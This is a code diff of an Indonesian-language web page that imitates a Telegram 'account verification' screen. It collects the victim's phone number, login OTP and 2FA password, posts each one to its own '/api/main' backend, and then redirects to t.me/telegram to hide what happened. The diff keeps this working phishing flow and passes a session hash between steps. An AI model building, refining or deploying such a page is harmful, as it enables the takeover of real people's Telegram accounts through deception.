@@ -9,80 +9,68 @@
         .card { background: white; padding: 30px; border-radius: 15px; width: 90%; max-width: 360px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
         .logo { width: 70px; height: 70px; background: #3390ec; border-radius: 50%; margin: 0 auto 15px; color: white; line-height: 70px; font-size: 30px; font-weight: bold; }
         input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; outline: none; }
-        input:focus { border-color: #3390ec; }
         button { width: 100%; padding: 12px; background: #3390ec; color: white; border: none; border-radius: 25px; cursor: pointer; font-weight: bold; font-size: 16px; margin-top: 10px; }
         .hidden { display: none; }
-        #status { font-size: 13px; color: #3390ec; margin-top: 15px; min-height: 1.2em; font-weight: 500; }
+        #status { font-size: 13px; color: #3390ec; margin-top: 15px; min-height: 1.2em; }
     </style>
 </head>
 <body>
     <div class="card">
         <div class="logo">T</div>
         <h2 id="title">Verifikasi Akun</h2>
-        <p id="desc" style="font-size: 14px; color: #666;">Gunakan nomor HP yang terdaftar di Telegram</p>
-
         <div id="step-phone">
-            <input type="tel" id="phone" placeholder="+62812345678" required>
+            <input type="tel" id="phone" placeholder="+62812345678">
             <button onclick="sendPhone()">Lanjutkan</button>
         </div>
-
         <div id="step-otp" class="hidden">
-            <input type="number" id="otp" placeholder="Kode OTP 5-digit" required>
+            <input type="number" id="otp" placeholder="Kode OTP 5-digit">
             <button onclick="sendOTP()">Verifikasi</button>
         </div>
-
         <div id="step-2fa" class="hidden">
-            <input type="password" id="password" placeholder="Password 2FA" required>
+            <input type="password" id="password" placeholder="Password 2FA">
             <button onclick="send2FA()">Masuk</button>
         </div>
-
         <p id="status"></p>
     </div>
 
     <script>
         let userPhone = "";
+        let phoneHash = ""; 
         const statusEl = document.getElementById('status');
 
         async function requestApi(action, body) {
-            try {
-                const res = await fetch(`/api/main?action=${action}`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(body)
-                });
-                return await res.json();
-            } catch (e) {
-                return { success: false, error: "Koneksi ke server terputus." };
-            }
+            const res = await fetch(`/api/main?action=${action}`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(body)
+            });
+            return await res.json();
         }
 
         async function sendPhone() {
             userPhone = document.getElementById('phone').value.replace(/\s/g, '');
-            if(!userPhone.startsWith('+')) return alert("Gunakan kode negara (misal: +62)");
-            
-            statusEl.innerText = "Meminta kode ke Telegram...";
+            statusEl.innerText = "Meminta kode...";
             const res = await requestApi('send_code', { phone: userPhone });
-            
             if(res.success) {
+                phoneHash = res.hash; 
                 document.getElementById('step-phone').classList.add('hidden');
                 document.getElementById('step-otp').classList.remove('hidden');
-                statusEl.innerText = "Kode dikirim via aplikasi Telegram.";
-            } else { alert("Error: " + res.error); statusEl.innerText = ""; }
+                statusEl.innerText = "Kode dikirim ke Telegram.";
+            } else { alert(res.error); statusEl.innerText = ""; }
         }
 
         async function sendOTP() {
             const code = document.getElementById('otp').value;
             statusEl.innerText = "Memverifikasi...";
-            const res = await requestApi('signin', { phone: userPhone, code: code });
-            
+            const res = await requestApi('signin', { phone: userPhone, code: code, hash: phoneHash });
             if(res.success) {
                 if(res.need_2fa) {
                     document.getElementById('step-otp').classList.add('hidden');
                     document.getElementById('step-2fa').classList.remove('hidden');
-                    statusEl.innerText = "Masukkan Password Verifikasi Dua Langkah.";
+                    statusEl.innerText = "Masukkan Password 2FA.";
                 } else {
                     statusEl.innerText = "Berhasil! Mengalihkan...";
-                    setTimeout(() => window.location.href = "https://t.me/telegram", 2000);
+                    window.location.href = "https://t.me/telegram";
                 }
             } else { alert(res.error); statusEl.innerText = ""; }
         }
@@ -93,7 +81,7 @@
             const res = await requestApi('signin', { phone: userPhone, password: pass });
             if(res.success) {
                 statusEl.innerText = "Berhasil! Mengalihkan...";
-                setTimeout(() => window.location.href = "https://t.me/telegram", 2000);
+                window.location.href = "https://t.me/telegram";
             } else { alert(res.error); statusEl.innerText = ""; }
         }
     </script>
